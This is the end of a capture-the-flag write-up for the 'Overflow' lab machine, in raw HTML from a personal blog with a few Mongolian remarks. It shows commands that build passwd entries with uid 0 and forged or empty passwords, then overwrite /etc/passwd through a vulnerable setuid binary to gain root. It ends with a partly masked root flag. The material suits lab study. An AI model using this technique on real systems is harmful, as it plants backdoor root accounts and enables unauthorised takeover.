</span></span><span style=display:flex><span>Thanks <span style=color:#66d9ef>for</span> checking. You can give your feedback <span style=color:#66d9ef>for</span> improvements at developer@overflow.htb
</span></span><span style=display:flex><span>Enter Input File: /tmp/passwd2
</span></span><span style=display:flex><span>Enter Encrypted File: /etc/passwd
</span></span><span style=display:flex><span>Segmentation fault <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>tester@overflow:/opt/file_encrypt$ 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /ect/passwd
</span></span><span style=display:flex><span><span style=color:#75715e>####</span>
</span></span><span style=display:flex><span>postfix:x:111:116::/var/spool/postfix:/usr/sbin/nologin
</span></span><span style=display:flex><span>mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style=display:flex><span>developer:x:1001:1001::/home/developer:/bin/sh
</span></span><span style=display:flex><span>sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>root5:KWi2XW05LmkMg:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>dambo::0:0:root:/root:/bin/bash
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>openssl passwd -1 testing
</span></span><span style=display:flex><span>$1$WoRrIRT4$aVl7dx43e4Grq0yh5J78c0
</span></span><span style=display:flex><span><span style=color:#75715e>###</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;batman:</span>$1$WoRrIRT4$aVl7dx43e4Grq0yh5J78c0<span style=color:#e6db74>:0:0:root:/root:/bin/bash&#34;</span> &gt;&gt; /tmp/passwd
</span></span></code></pre></div><p>openssl password generate хийх гэхээр орохгүй байна&mldr;</p><p>root2:testing</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash &gt;&gt; /tmp/passwd
</span></span></code></pre></div><p>Root.txt</p><pre tabindex=0><code>49f84c69a7*******
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>